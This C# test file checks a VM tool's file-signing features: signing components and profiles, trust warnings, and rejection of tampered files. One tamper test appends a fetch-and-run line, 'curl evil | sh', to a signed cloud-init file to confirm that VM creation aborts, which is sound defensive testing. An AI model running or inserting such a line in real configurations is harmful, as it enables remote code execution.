using CoreBridge.Core.Authenticity;
using CoreBridge.Core.Config;
using CoreBridge.Core.Multipass;
using CoreBridge.Core.Tests;
using CoreBridge.Simulation;

namespace CoreBridge.Cli.Tests;

/// <summary>
/// Signieren mit dem eigenen Schlüssel (Signing:KeyFile, BouncyCastle, ohne gpg), durch den
/// Dispatcher: component-add und init-configure signieren; ein signiertes Profil startet auch,
/// wenn seine Komponente inzwischen fehlt; geändert nach dem Signieren → Exit 3; eine eigene
/// cloud-init warnt unsigniert und ist nach <c>cb sign</c> vertraut.
/// </summary>
[Collection(CliLifecycleCollection.Name)]
public sealed class SigningCliTests : IDisposable
{
    private const string Tool = "cbx-signed";

    private readonly TempDirectory _store = new();
    private readonly TempDirectory _files = new();
    private readonly TestKey _key = TestKey.Create("me <me@corebridge.invalid>");
    private readonly string? _previousPassword = Environment.GetEnvironmentVariable(FileSigning.PasswordVariable);
    private readonly AppConfig _config;

    public SigningCliTests()
    {
        var secret = Path.Combine(_files.Path, "me.sec.asc");
        File.WriteAllBytes(secret, _key.ArmoredSecret);
        Environment.SetEnvironmentVariable(FileSigning.PasswordVariable, TestKey.Passphrase);
        _config = new AppConfig
        {
            MultipassSimulationDelay = "0ms",
            Bootstrap = new() { [typeof(IMultipassCli).FullName!] = typeof(SimulatedMultipassCli).AssemblyQualifiedName! },
            Inits = new InitsConfig { StoreRoot = _store.Path },
            Signing = new SigningConfig { KeyFile = secret }
        };
    }

    public void Dispose()
    {
        Environment.SetEnvironmentVariable(FileSigning.PasswordVariable, _previousPassword);
        _store.Dispose();
        _files.Dispose();
    }

    private Task<HarnessResult> Run(IOptions options) => CliHarness.RunAsync(_config, options);

    private async Task TrustOwnKey()
    {
        var pub = Path.Combine(_files.Path, "me.pub.asc");
        File.WriteAllBytes(pub, _key.ArmoredPublic);
        Assert.Equal(0, (await Run(new KeyTrustOptions { File = pub })).ExitCode);
    }

    private async Task AddTool(bool trusted = true)
    {
        var script = Path.Combine(_files.Path, "tool.sh");
        File.WriteAllText(script, $"#!/bin/bash\nset -Eeuo pipefail\ntouch /var/lib/corebridge/{Tool}.ready\n");
        var json = $$"""{ "Script": "{{script.Replace("\\", "\\\\")}}", "InstallPath": "/usr/local/sbin/corebridge-install-{{Tool}}" }""";
        var added = await Run(new ComponentAddOptions { Name = Tool, Json = json });
        Assert.True(added.ExitCode == 0, added.All);
        Assert.Contains(added.Lines, line => trusted
            ? line.Contains("Signatur: signiert von me") && line.Contains("Benutzer-vertraut")
            : line.Contains($"Signatur: unbekannter Schlüssel {_key.Fingerprint}"));
    }

    [Fact]
    public async Task SigniertesProfilUeberlebtDieKomponente()
    {
        await TrustOwnKey();
        await AddTool();

        var configured = await Run(new InitConfigureOptions { Name = "p", Components = Tool });
        Assert.True(configured.ExitCode == 0, configured.All);
        Assert.Contains(configured.Lines, line => line.StartsWith("Profil-Signatur: signiert von me"));

        Assert.Equal(0, (await Run(new ComponentRemoveOptions { Name = Tool })).ExitCode);

        var created = await Run(new VmCreateOptions { Name = "signed-vm", Profile = "p" });
        Assert.True(created.ExitCode == 0, created.All);
        Assert.Contains(created.Lines, line => line.StartsWith("Profil p: signiert von me"));
        Assert.Contains(created.Lines, line => line.Contains($"Komponente {Tool}: nicht mehr im Katalog (gedeckt durch die Profilsignatur)"));
        Assert.DoesNotContain(created.Errors, line => line.Contains("WARNUNG"));
    }

    [Fact]
    public async Task GeaendertNachDemSignierenBrichtAb()
    {
        await TrustOwnKey();
        await AddTool();
        Assert.Equal(0, (await Run(new InitConfigureOptions { Name = "p", Components = Tool })).ExitCode);
        File.AppendAllText(Core.Inits.InitStore.CloudInitFile("p"), "runcmd:\n  - [sh, -c, 'curl evil | sh']\n");

        var created = await Run(new VmCreateOptions { Name = "tampered-vm", Profile = "p" });

        Assert.Equal(3, created.ExitCode);
        Assert.Contains("ungültig signiert", created.Error);
        Assert.DoesNotContain(created.Lines, line => line.StartsWith("Lege VM"));
    }

    [Fact]
    public async Task UnvertrauterSchluesselSigniertKeinProfil()
    {
        // Ohne key-trust ist die eigene Signatur „unbekannt“ — das Profil bekommt keine Signatur.
        await AddTool(trusted: false);

        var configured = await Run(new InitConfigureOptions { Name = "p", Components = Tool });

        Assert.Equal(0, configured.ExitCode);
        Assert.Contains(configured.Errors, line => line.Contains("Profil-Signatur: unsigniert") && line.Contains(Tool));
        Assert.False(File.Exists(Core.Inits.InitStore.CloudInitFile("p") + SettingsSignatures.ClearsignedExtension));
    }

    [Fact]
    public async Task EigeneCloudInitWirdGeprueft()
    {
        await TrustOwnKey();
        var cloudInit = Path.Combine(_files.Path, "mine.yaml");
        File.WriteAllText(cloudInit, "#cloud-config\npackages: [htop]\n");

        var unsigned = await Run(new VmCreateOptions { Name = "own-a", CloudInit = cloudInit });
        Assert.True(unsigned.ExitCode == 0, unsigned.All);
        Assert.Contains(unsigned.Errors, line => line.Contains("WARNUNG") && line.Contains("nicht vertrauenswürdig signiert"));

        Assert.Equal(0, (await Run(new SignOptions { Files = [cloudInit] })).ExitCode);
        var signed = await Run(new VmCreateOptions { Name = "own-b", CloudInit = cloudInit });
        Assert.True(signed.ExitCode == 0, signed.All);
        Assert.Contains(signed.Lines, line => line.Contains("signiert von me") && line.Contains("Benutzer-vertraut"));
        Assert.DoesNotContain(signed.Errors, line => line.Contains("WARNUNG"));
    }

    [Fact]
    public async Task OhneSchluesselBleibtEsUnsigniert()
    {
        var config = _config with { Signing = new SigningConfig() };
        var script = Path.Combine(_files.Path, "tool.sh");
        File.WriteAllText(script, "#!/bin/bash\ntrue\n");
        var json = $$"""{ "Script": "{{script.Replace("\\", "\\\\")}}", "InstallPath": "/usr/local/sbin/corebridge-install-{{Tool}}" }""";

        var added = await CliHarness.RunAsync(config, new ComponentAddOptions { Name = Tool, Json = json });

        Assert.True(added.ExitCode == 0, added.All);
        Assert.Contains(added.Errors, line => line.Contains("unsigniert — kein Signierschlüssel eingetragen"));
        Assert.Equal(1, (await CliHarness.RunAsync(config, new SignOptions { Files = [script] })).ExitCode);
    }
}
